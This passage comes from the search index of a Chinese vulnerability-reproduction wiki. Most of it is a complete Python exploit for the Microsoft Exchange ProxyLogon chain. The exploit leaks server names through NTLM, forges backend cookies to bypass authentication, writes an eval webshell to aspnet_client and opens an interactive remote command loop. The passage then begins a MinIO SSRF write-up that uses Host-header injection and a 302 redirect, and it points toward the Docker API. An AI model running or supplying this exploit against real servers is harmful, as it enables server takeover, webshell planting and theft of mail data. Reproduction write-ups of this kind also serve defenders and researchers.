NTML\u534f\u5546\u6d88\u606f\u4f1a\u8fd4\u56de\u6211\u4eecNTML\u8be2\u95ee\u4fe1\u606f\uff0c \u5176\u4e2d\u5305\u542b\u4e86 AV_PAIR\u7ed3\u6784\uff0c\u5176\u4e2d\u5305\u542b\u4e86 \u540e\u7aef\u670d\u52a1\u5668\u540d\u79f0\u4e0e\u57df\u540d base64\u89e3\u5bc6\u5176\u4e2d\u7684\u52a0\u5bc6\u90e8\u5206 \u5728\u901a\u8fc7\u89e3\u5305\u7684\u65b9\u6cd5\u8f6c\u6362\u5176\u4e2d\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u5f97\u5230\u5b8c\u6574\u7684\u540e\u7aef\u670d\u52a1\u5668\u540d\u79f0\u4e0e\u57df\u540d \u540e\u9762\u7684\u5927\u5bb6\u5c31\u53c2\u8003\u6587\u7ae0\u548cEXP\u6765\u7814\u7a76\u539f\u7406\u5427\uff0c\u51e0\u7bc7\u6587\u7ae0\u548cEXP\u5df2\u7ecf\u5f88\u5b8c\u6574\u4e86","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858%2027065/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] EXP\u6839\u636e\u63a8\u7279\u548cGithub\u51e0\u4e2a\u811a\u672c\u66f4\u6539 \u9ed8\u8ba4\u6253\u7684\u90ae\u7bb1\u4e3a administrator@xxx.xxx.cn (\u53ef\u4ee5\u81ea\u884c\u66f4\u6539) webshell\u8def\u5f84\u548c\u811a\u672c\u6587\u4ef6\u4e2d\u66f4\u6539 \u8fd0\u884c\u7684\u547d\u4ee4\u662f ping Dnslog\u8bc1\u660e\u6f0f\u6d1e\u5b58\u5728(\u4e00\u4e9b\u4e1c\u897f\u5c31\u5927\u5bb6\u81ea\u5df1\u770b\u770b\u811a\u672c\u6539\u5427~) #!/usr/bin/python2 # coding: UTF-8 import re import sys import json import string import requests from urllib import urlencode from tld import get_fld from struct import unpack from base64 import b64encode , b64decode from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Microsoft Exchang \u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> mail.xxx.org \\033 [0m' ) print ( '+ \\033 [36mEmail >>> Administrator@\u6839\u57df\u540d (\u9ed8\u8ba4) \\033 [0m' ) print ( '+------------------------------------------' ) def _unpack_str ( byte_string ): return byte_string . decode ( 'UTF-8' ) . replace ( ' \\x00 ' , '' ) def _unpack_int ( format , data ): return unpack ( format , data )[ 0 ] def parse_challenge ( Negotiate_base64_decode ): target_info_field = Negotiate_base64_decode [ 40 : 48 ] target_info_len = _unpack_int ( 'H' , target_info_field [ 0 : 2 ]) target_info_offset = _unpack_int ( 'I' , target_info_field [ 4 : 8 ]) target_info_bytes = Negotiate_base64_decode [ target_info_offset : target_info_offset + target_info_len ] domain_name = '' computer_name = '' info_offset = 0 while info_offset < len ( target_info_bytes ): av_id = _unpack_int ( 'H' , target_info_bytes [ info_offset : info_offset + 2 ]) av_len = _unpack_int ( 'H' , target_info_bytes [ info_offset + 2 : info_offset + 4 ]) av_value = target_info_bytes [ info_offset + 4 : info_offset + 4 + av_len ] info_offset = info_offset + 4 + av_len if av_id == 2 : # MsvAvDnsDomainName domain_name = _unpack_str ( av_value ) elif av_id == 3 : # MsvAvDnsComputerName computer_name = _unpack_str ( av_value ) if domain_name and computer_name : return domain_name , computer_name else : print ( \" \\033 [31m[x] \u8ba1\u7b97\u673a\u540d\u79f0\u6216\u57df\u540d\u79f0\u83b7\u53d6\u5931\u8d25\" ) sys . exit ( 0 ) def POC_1 ( target_url , Email ): print ( \" \\033 [32m[o] \u6b63\u5728\u83b7\u53d6 \u8ba1\u7b97\u673a\u540d\u79f0\u548c\u57df\u540d\u79f0..... \\033 [0m\" ) ntlm_type1 = ( 'NTLMSSP \\x00 ' # NTLMSSp\u7b7e\u540d ' \\x01\\x00\\x00\\x00 ' # \u4fe1\u606f\u7c7b\u578b ' \\x97\\x82\\x08\\xe2 ' # \u6807\u8bb0 ' \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ' # \u57df\u540d\u79f0\u5b57\u7b26 ' \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ' # \u5de5\u4f5c\u5b57\u7b26 ' \\x0a\\x00\\xba\\x47\\x00\\x00\\x00\\x0f ' # \u7cfb\u7edf\u7248\u672c ) headers = { 'Authorization' : 'Negotiate {} ' . format ( b64encode ( ntlm_type1 )) } basic_url = 'https:// {} /rpc/' . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = basic_url , headers = headers , verify = False ) if response . status_code == 401 : Negotiate_base64_encode = response . headers [ 'WWW-Authenticate' ] Negotiate_base64_decode = re . search ( 'Negotiate ([A-Za-z0-9/+=]+)' , Negotiate_base64_encode ) . group ( 1 ) domain_name , computer_name = parse_challenge ( b64decode ( Negotiate_base64_decode )) print ( \" \\033 [32m[o] \u8ba1\u7b97\u673a\u540d\u79f0: {} \\033 [0m\" . format ( computer_name )) print ( \" \\033 [32m[o] \u57df\u540d\u79f0: {} \\033 [0m\" . format ( domain_name )) POC_2 ( target_url , Email , computer_name ) else : print ( \" \\033 [31m[x] \u83b7\u53d6\u5931\u8d25\" ) sys . exit ( 0 ) def POC_2 ( target_url , Email , computer_name ): payload = ''' <Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"> <Request> <EMailAddress> %s </EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema> </Request> </Autodiscover> ''' % Email vuln_url = '/autodiscover/autodiscover.xml' headers = { 'User-Agent' : 'ExchangeServicesClient/0.0.0.0' , 'Content-Type' : 'text/xml' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ?#~1941962753' . format ( computer_name , vuln_url ), 'msExchLogonMailbox' : 'S-1-5-20' } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) LegacyDN = re . findall ( r '<LegacyDN>(.*?)</LegacyDN>' , response . text )[ 0 ] print ( \" \\033 [32m[o] LegacyDN: {} \\033 [0m\" . format ( LegacyDN )) vuln_url = '/mapi/emsmdb/' headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ?#~1941962753' . format ( computer_name , vuln_url ), 'Content-Type' : 'application/mapi-http' , 'msExchLogonMailbox' : 'S-1-5-20' , } payload = LegacyDN + ' \\x00\\x00\\x00\\x00\\x00\\x20\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00 ' url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) SID = re . search ( 'with SID ([S\\-0-9]+) ' , response . content ) . group ( 1 ) print ( \" \\033 [32m[o] SID: {} \\033 [0m\" . format ( SID )) vuln_url = '/ecp/proxyLogon.ecp' payload = '<r at=\"NTLM\" ln=\" %s \"><s t=\"0\"> %s </s></r>' % ( Email . split ( '@' )[ 0 ], SID ) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ?#~1941962753' . format ( computer_name , vuln_url ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) session_id = response . cookies . get ( 'ASP.NET_SessionId' ) canary = response . cookies . get ( 'msExchEcpCanary' ) print ( \" \\033 [32m[o] Session_id: {} \\033 [0m\" . format ( session_id )) print ( \" \\033 [32m[o] Canary : {} \\033 [0m\" . format ( canary )) extra_cookies = [ 'ASP.NET_SessionId=' + session_id , 'msExchEcpCanary=' + canary ] vuln_url = '/ecp/DDI/DDIService.svc/GetObject' qs = urlencode ({ 'schema' : 'OABVirtualDirectory' , 'msExchEcpCanary' : canary }) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ? {} #~1941962753;ASP.NET_SessionId= {} ;msExchEcpCanary= {} ' . format ( computer_name , vuln_url , qs , session_id , canary ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = '' , verify = False , allow_redirects = False ) identity = response . json ()[ 'd' ][ 'Output' ][ 0 ][ 'Identity' ] print ( \" \\033 [32m[o] OAB Name: {} \\033 [0m\" . format ( identity [ 'DisplayName' ])) print ( \" \\033 [32m[o] OAB ID: {} \\033 [0m\" . format ( identity [ 'RawIdentity' ])) FILE_PATH = 'C: \\\\ inetpub \\\\ wwwroot \\\\ aspnet_client \\\\ PeiQi.aspx' FILE_DATA = '<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"PeiQi\"],\"unsafe\");}</script>' vuln_url = '/ecp/DDI/DDIService.svc/SetObject' qs = urlencode ({ 'schema' : 'OABVirtualDirectory' , 'msExchEcpCanary' : canary }) payload = json . dumps ({ 'identity' : { '__type' : 'Identity:ECP' , 'DisplayName' : identity [ 'DisplayName' ], 'RawIdentity' : identity [ 'RawIdentity' ] }, 'properties' : { 'Parameters' : { '__type' : 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel' , 'ExternalUrl' : 'http://f/' + FILE_DATA } } }) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ? {} #~1941962753;ASP.NET_SessionId= {} ;msExchEcpCanary= {} ' . format ( computer_name , vuln_url , qs , session_id , canary ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u901a\u8fc7OAB\u8bbe\u7f6eWebshell\u6210\u529f \\033 [0m\" ) vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode ({ 'schema' : 'ResetOABVirtualDirectory' , 'msExchEcpCanary' : canary }) payload = json . dumps ({ 'identity' : { '__type' : 'Identity:ECP' , 'DisplayName' : identity [ 'DisplayName' ], 'RawIdentity' : identity [ 'RawIdentity' ] }, 'properties' : { 'Parameters' : { '__type' : 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel' , 'FilePathName' : FILE_PATH } } }) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ? {} #~1941962753;ASP.NET_SessionId= {} ;msExchEcpCanary= {} ' . format ( computer_name , vuln_url , qs , session_id , canary ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6b63\u5728\u5c1d\u8bd5\u5199\u5165Webshell \\033 [0m\" ) vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode ({ 'schema' : 'OABVirtualDirectory' , 'msExchEcpCanary' : canary }) payload = json . dumps ({ 'identity' : { '__type' : 'Identity:ECP' , 'DisplayName' : identity [ 'DisplayName' ], 'RawIdentity' : identity [ 'RawIdentity' ] }, 'properties' : { 'Parameters' : { '__type' : 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel' , 'ExternalUrl' : '' } } }) headers = { 'X-Clientapplication' : 'Outlook/15.0.4815.1002' , 'X-Requestid' : 'x' , 'X-Requesttype' : 'Connect' , 'Cookie' : 'X-BEResource=a]@ {} :444 {} ? {} #~1941962753;ASP.NET_SessionId= {} ;msExchEcpCanary= {} ' . format ( computer_name , vuln_url , qs , session_id , canary ), 'Content-Type' : 'application/json' , 'msExchLogonMailbox' : 'S-1-5-20' , } url = \"https:// {} /ecp/PeiQi.js\" . format ( target_url ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url , headers = headers , data = payload , verify = False , allow_redirects = False ) print ( \" \\033 [32m[o] \u6e05\u9664 OAB \\033 [0m\" ) print ( \" \\033 [32m[o] \u6b63\u5728\u9a8c\u8bc1 Webshell\u662f\u5426\u4e0a\u4f20\u6210\u529f.......... \\033 [0m\" ) webshell_url = \"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\" requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = webshell_url , verify = False , allow_redirects = False ) if response . status_code == 200 and \"Name\" in response . text : print ( \" \\033 [32m[o] \u4e0a\u4f20 Webshll\u6210\u529f, \u5730\u5740\u4e3a: {} \\033 [0m\" . format ( \"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\" )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : Cmd = str ( raw_input ( \" \\033 [35mCmd >>> \\033 [0m\" )) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) Cmd_url = \"https://\" + target_url + '/aspnet_client/PeiQi.aspx?PeiQi=Response.Write(new%20ActiveXObject(\"WScript.Shell\").exec(\"cmd /c {} \").StdOut.ReadAll());' . format ( Cmd ) response = requests . get ( url = Cmd_url , verify = False , allow_redirects = False ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) if __name__ == '__main__' : reload ( sys ) sys . setdefaultencoding ( 'utf8' ) title () target_url = str ( raw_input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Email = \"Administrator@ {} \" . format ( get_fld ( \"https://\" + target_url )) print ( \" \\033 [32m[o] \u8bf7\u6c42\u5730\u5740: {} \uff0c\u4f7f\u7528\u7684\u90ae\u7bb1: {} \\033 [0m\" . format ( target_url , Email )) POC_1 ( target_url , Email )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MinIO/MinIO%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/","text":"MinIO SSRF\u6f0f\u6d1e CVE-2021-21287 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u968f\u7740\u5de5\u4f5c\u548c\u751f\u6d3b\u4e2d\u7684\u4e00\u4e9b\u73af\u5883\u9010\u6e10\u5f80\u4e91\u7aef\u8fc1\u79fb\uff0c\u5bf9\u8c61\u5b58\u50a8\u7684\u9700\u6c42\u4e5f\u9010\u6e10\u591a\u4e86\u8d77\u6765\uff0c MinIO \u5c31\u662f\u4e00\u6b3e\u652f\u6301\u90e8\u7f72\u5728\u79c1\u6709\u4e91\u7684\u5f00\u6e90\u5bf9\u8c61\u5b58\u50a8\u7cfb\u7edf\u3002MinIO\u5b8c\u5168\u517c\u5bb9AWS S3\u7684\u534f\u8bae\uff0c\u4e5f\u652f\u6301\u4f5c\u4e3aS3\u7684\u7f51\u5173\uff0c\u6240\u4ee5\u5728\u5168\u7403\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u5728Github\u4e0a\u5df2\u670925k\u661f\u661f\u3002MinIO\u4e2d\u5b58\u5728SSRF\u6f0f\u6d1e\uff0c\u901a\u8fc7\u6f0f\u6d1e\u53ef\u4ee5\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u6216\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] MinIO \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u65e2\u7136\u6211\u4eec\u9009\u62e9\u4e86\u4eceMinIO\u5165\u624b\uff0c\u90a3\u4e48\u5148\u4e86\u89e3\u4e00\u4e0bMinIO\u3002\u5176\u5b9e\u6211\u524d\u9762\u4e5f\u8bf4\u4e86\uff0c\u56e0\u4e3a\u5e73\u65f6\u7528\u5230MinIO\u7684\u65f6\u5019\u5f88\u591a\uff0c\u6240\u4ee5\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7701\u7565\u4e86\u3002\u5176\u4f7f\u7528Go\u5f00\u53d1\uff0c\u63d0\u4f9bHTTP\u63a5\u53e3\uff0c\u800c\u4e14\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a\u524d\u7aef\u9875\u9762\uff0c\u540d\u4e3a\u201cMinIO Browser\u201d\u3002\u5f53\u7136\uff0c\u524d\u7aef\u9875\u9762\u5c31\u662f\u4e00\u4e2a\u767b\u9646\u63a5\u53e3\uff0c\u4e0d\u77e5\u9053\u53e3\u4ee4\u65e0\u6cd5\u767b\u5f55\u3002 \u90a3\u4e48\u4ece\u5165\u53e3\u70b9\uff08\u524d\u7aef\u63a5\u53e3\uff09\u5f00\u59cb\u5bf9\u5176\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1\u5427\u3002 \u5728User-Agent\u6ee1\u8db3\u6b63\u5219 .*Mozilla.* \u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5373\u53ef\u8bbf\u95eeMinIO\u7684\u524d\u7aef\u63a5\u53e3\uff0c\u524d\u7aef\u63a5\u53e3\u662f\u4e00\u4e2a\u81ea\u5df1\u5b9e\u73b0\u7684JsonRPC\uff1a \u6211\u4eec\u611f\u5174\u8da3\u7684\u5c31\u662f\u5176\u9274\u6743\u7684\u65b9\u6cd5\uff0c\u968f\u4fbf\u627e\u5230\u4e00\u4e2aRPC\u65b9\u6cd5\uff0c\u53ef\u89c1\u5176\u5f00\u5934\u8c03\u7528\u4e86 webRequestAuthenticate \uff0c\u8ddf\u8fdb\u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u8fd9\u91cc\u7528\u7684\u662fjwt\u9274\u6743\uff1a jwt\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709\u4e0b\u9762\u8fd9\u51e0\u79cd\uff1a \u5c06alg\u8bbe\u7f6e\u4e3aNone\uff0c\u544a\u8bc9\u670d\u52a1\u5668\u4e0d\u8fdb\u884c\u7b7e\u540d\u6821\u9a8c \u5982\u679calg\u4e3aRSA\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\u4e3aHS256\uff0c\u5373\u544a\u8bc9\u670d\u52a1\u5668\u4f7f\u7528\u516c\u94a5\u8fdb\u884c\u7b7e\u540d\u7684\u6821\u9a8c \u7206\u7834\u7b7e\u540d\u5bc6\u94a5 \u67e5\u770bMinIO\u7684JWT\u6a21\u5757\uff0c\u53d1\u73b0\u5176\u4e2d\u5bf9alg\u8fdb\u884c\u4e86\u6821\u9a8c\uff0c\u53ea\u5141\u8bb8\u4ee5\u4e0b\u4e09\u79cd\u7b7e\u540d\u65b9\u6cd5\uff1a \u8fd9\u5c31\u5835\u6b7b\u4e86\u524d\u4e24\u79cd\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u7206\u7834\u5f53\u7136\u5c31\u66f4\u522b\u8bf4\u4e86\uff0c\u901a\u5e38\u4ec5\u4f5c\u4e3a\u6ca1\u529e\u6cd5\u7684\u60c5\u51b5\u4e0b\u7684\u624b\u6bb5\u3002\u5f53\u7136\uff0cMinIO\u4e2d\u4f7f\u7528\u7528\u6237\u7684\u5bc6\u7801\u4f5c\u4e3a\u7b7e\u540d\u7684\u5bc6\u94a5\uff0c\u8fd9\u4e2a\u5176\u5b9e\u4f1a\u8ba9\u7206\u7834\u53d8\u5730\u7b80\u5355\u4e00\u4e9b\u3002 \u9274\u6743\u8fd9\u5757\u6ca1\u5565\u7a81\u7834\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u770b\u770b\uff0c\u6709\u54ea\u4e9bRPC\u63a5\u53e3\u6ca1\u6709\u8fdb\u884c\u6743\u9650\u9a8c\u8bc1\u3002 \u5f88\u5feb\u627e\u5230\u4e86\u4e00\u4e2a\u63a5\u53e3\uff0c LoginSTS \u3002\u8fd9\u4e2a\u63a5\u53e3\u5176\u5b9e\u662fAWS STS\u767b\u5f55\u63a5\u53e3\u7684\u4e00\u4e2a\u4ee3\u7406\uff0c\u7528\u4e8e\u5c06\u53d1\u9001\u5230JsonRPC\u7684\u8bf7\u6c42\u8f6c\u53d8\u6210STS\u7684\u65b9\u5f0f\u8f6c\u53d1\u7ed9\u672c\u5730\u76849000\u7aef\u53e3\uff08\u4e5f\u5c31\u8fd8\u662f\u4ed6\u81ea\u5df1\uff0c\u56e0\u4e3a\u5b83\u662f\u517c\u5bb9AWS\u534f\u8bae\u7684\uff09\u3002 \u7b80\u5316\u5176\u4ee3\u7801\u5982\u4e0b\uff1a // LoginSTS - STS user login handler. func ( web * webAPIHandlers ) LoginSTS ( r * http . Request , args * LoginSTSArgs , reply * LoginRep ) error { ctx := newWebContext ( r , args , \"WebLoginSTS\" ) v := url . Values {} v . Set ( \"Action\" , webIdentity ) v . Set ( \"WebIdentityToken\" , args . Token ) v . Set ( \"Version\" , stsAPIVersion ) scheme := \"http\" // ... u := & url . URL { Scheme : scheme , Host : r . Host , } u . RawQuery = v . Encode () req , err := http . NewRequest ( http . MethodPost , u . String (), nil ) // ... } \u6ca1\u53d1\u73b0\u6709\u9274\u6743\u4e0a\u7684\u7ed5\u8fc7\u95ee\u9898\uff0c\u4f46\u662f\u53d1\u73b0\u4e86\u53e6\u4e00\u4e2a\u6709\u8da3\u7684\u95ee\u9898\u3002\u8fd9\u91cc\uff0cMinIO\u4e3a\u4e86\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u201c\u81ea\u5df1\u201d\uff0c\u5c31\u4ece\u7528\u6237\u53d1\u9001\u7684HTTP\u5934Host\u4e2d\u83b7\u53d6\u5230\u201c\u81ea\u5df1\u7684\u5730\u5740\u201d\uff0c\u5e76\u5c06\u5176\u4f5c\u4e3aURL\u7684Host\u6784\u9020\u4e86\u65b0\u7684URL\u3002 \u8fd9\u4e2a\u8fc7\u7a0b\u6709\u4ec0\u4e48\u95ee\u9898\u5462\uff1f \u56e0\u4e3a\u8bf7\u6c42\u5934\u662f\u7528\u6237\u53ef\u63a7\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u6784\u9020\u4efb\u610f\u7684Host\uff0c\u8fdb\u800c\u6784\u9020\u4e00\u4e2aSSRF\u6f0f\u6d1e\u3002 \u6211\u4eec\u6765\u5b9e\u9645\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u5411 http://192.168.227.131:9000 \u53d1\u9001\u5982\u4e0b\u8bf7\u6c42\uff0c\u5176\u4e2dHost\u7684\u503c\u662f\u6211\u672c\u5730ncat\u5f00\u653e\u7684\u7aef\u53e3\uff08 192.168.1.142:4444 \uff09\uff1a POST /minio/webrpc HTTP/1.1 Host: 192.168.1.142:4444 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Content-Type: application/json Content-Length: 80 {\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\": \"Test\"},\"method\":\"web.LoginSTS\"} \u6210\u529f\u6536\u5230\u8bf7\u6c42\uff1a \u53ef\u4ee5\u786e\u5b9a\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2aSSRF\u6f0f\u6d1e\u4e86\u3002 \u4ed4\u7ec6\u89c2\u5bdf\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2aPOST\u8bf7\u6c42\uff0c\u4f46\u662fPath\u548cBody\u90fd\u6ca1\u6cd5\u63a7\u5236\uff0c\u6211\u4eec\u80fd\u63a7\u5236\u7684\u53ea\u6709URL\u4e2d\u7684\u4e00\u4e2a\u53c2\u6570 WebIdentityToken \u3002 \u4f46\u662f\u8fd9\u4e2a\u53c2\u6570\u7ecf\u8fc7\u4e86URL\u7f16\u7801\uff0c\u65e0\u6cd5\u6ce8\u5165\u6362\u884c\u7b26\u7b49\u5176\u4ed6\u7279\u6b8a\u5b57\u7b26\u3002\u8fd9\u6837\u5c31\u6bd4\u8f83\u9e21\u808b\u4e86\uff0c\u5982\u679c\u4ec5\u4ece\u73b0\u5728\u6765\u770b\uff0c\u8fd9\u4e2aSSRF\u53ea\u80fd\u7528\u4e8e\u626b\u63cf\u7aef\u53e3\u3002\u6211\u4eec\u7684\u76ee\u6807\u5f53\u7136\u4e0d\u4ec5\u9650\u4e8e\u6b64\u3002 \u5e78\u8fd0\u7684\u662f\uff0cGo\u9ed8\u8ba4\u7684http\u5e93\u4f1a\u8ddf\u8e2a302\u8df3\u8f6c\uff0c\u800c\u4e14\u4e0d\u8bba\u662fGET\u8fd8\u662fPOST\u8bf7\u6c42\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u8fd9\u91cc\u53ef\u4ee5302\u8df3\u8f6c\u6765\u201c\u5347\u7ea7\u201dSSRF\u6f0f\u6d1e\u3002 \u4f7f\u7528PHP\u6765\u7b80\u5355\u5730\u6784\u9020\u4e00\u4e2a302\u8df3\u8f6c\uff1a <?php header ( 'Location: http://192.168.1.142:4444/attack?arbitrary=params' ); \u5c06\u5176\u4fdd\u5b58\u6210index.php\uff0c\u542f\u52a8\u4e00\u4e2aPHP\u670d\u52a1\u5668\uff1a \u5c06Host\u6307\u5411\u8fd9\u4e2aPHP\u670d\u52a1\u5668\u3002\u8fd9\u6837\uff0c\u7ecf\u8fc7\u4e00\u6b21302\u8df3\u8f6c\uff0c\u6211\u4eec\u6536\u83b7\u4e86\u4e00\u4e2a\u53ef\u4ee5\u63a7\u5236\u5b8c\u6574URL\u7684GET\u8bf7\u6c42\uff1a \u653e\u5bbd\u4e86\u4e00\u4e9b\u9650\u5236\uff0c\u7ed3\u5408\u524d\u9762\u6211\u5bf9\u8fd9\u5957\u5185\u7f51\u7684\u4e86\u89e3\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u653b\u51fbDocker\u96c6\u7fa4\u76842375\u7aef\u53e3\u3002 2375\u662fDocker API\u7684\u63a5\u53e3\uff0c\u4f7f\u7528HTTP\u534f\u8bae\u901a\u4fe1\uff0c\u9ed8\u8ba4\u4e0d\u4f1a\u76d1\u542cTCP\u5730\u5740\uff0c\u8fd9\u91cc\u53ef\u80fd\u662f\u4e3a\u4e86\u65b9\u4fbf\u5185\u7f51\u5176\u4ed6\u673a\u5668\u4f7f\u7528\u6240\u4ee5\u5f00\u653e\u5728\u5185\u7f51\u7684\u5730\u5740\u91cc\u4e86\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u901a\u8fc7SSRF\u6765\u653b\u51fb\u8fd9\u4e2a\u63a5\u53e3\u5462\uff1f \u5728Docker\u672a\u6388\u6743\u8bbf\u95ee\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528 docker run \u6216 docker exec \u6765\u5728\u76ee\u6807\u5bb9\u5668\u91cc\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff08\u5982\u679c\u4f60\u4e0d\u4e86\u89e3\uff0c\u53ef\u4ee5\u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 \uff09\u3002\u4f46\u662f\u7ffb\u9605Docker\u7684\u6587\u6863\u53ef\u77e5\uff0c\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u7684\u8bf7\u6c42\u662f POST /containers/create \u548c POST /containers/{id}/exec \u3002 \u4e24\u4e2aAPI\u90fd\u662fPOST\u8bf7\u6c42\uff0c\u800c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u7684SSRF\u5374\u662f\u4e00\u4e2aGET\u7684\u3002\u600e\u4e48\u529e\u5462\uff1f 